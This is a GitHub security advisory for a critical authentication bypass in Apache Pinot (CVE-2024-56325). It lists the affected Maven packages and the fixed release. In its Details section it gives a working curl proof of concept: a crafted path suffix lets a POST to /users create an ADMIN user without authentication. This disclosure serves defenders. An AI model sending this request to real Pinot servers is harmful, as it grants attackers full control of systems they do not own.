# [C] Apache Pinot Vulnerable to Authentication Bypass

## Summary
Severity: Critical
Advisory: GHSA-6jwp-4wvj-6597
CVE: CVE-2024-56325
CWE: CWE-288
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-04-01
Source: https://github.com/advisories/GHSA-6jwp-4wvj-6597
Type: github-advisory

## Affected
- Maven: `org.apache.pinot:pinot-broker` — affected >=0.8.0 <1.3.0
- Maven: `org.apache.pinot:pinot-common` — affected >=0.8.0 <1.3.0
- Maven: `org.apache.pinot:pinot-controller` — affected >=0.8.0 <1.3.0

## Details
Authentication Bypass Issue

If the path does not contain / and contain., authentication is not required.

Expected Normal Request and Response Example

curl -X POST -H "Content-Type: application/json" -d {\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}  http://{server_ip}:9000/users 


Return: {"code":401,"error":"HTTP 401 Unauthorized"}


Malicious Request and Response Example 

curl -X POST -H "Content-Type: application/json" -d '{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'  http://{serverip}:9000/users; http://{serverip}:9000/users; .


Return: {"users":{}}



 

A new user gets added bypassing authentication, enabling the user to control Pinot.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2024-56325
- https://github.com/apache/pinot/pull/14383
- https://github.com/apache/pinot/commit/1b87488aeaf4836e3ef25b426ebbf1ad5a68e68f
- https://github.com/apache/pinot/commit/89a22f097c5ff26396e58950c90d764066a56121
- https://github.com/apache/pinot
- https://github.com/apache/pinot/releases/tag/release-1.3.0
- https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v
- http://www.openwall.com/lists/oss-security/2025/03/27/8
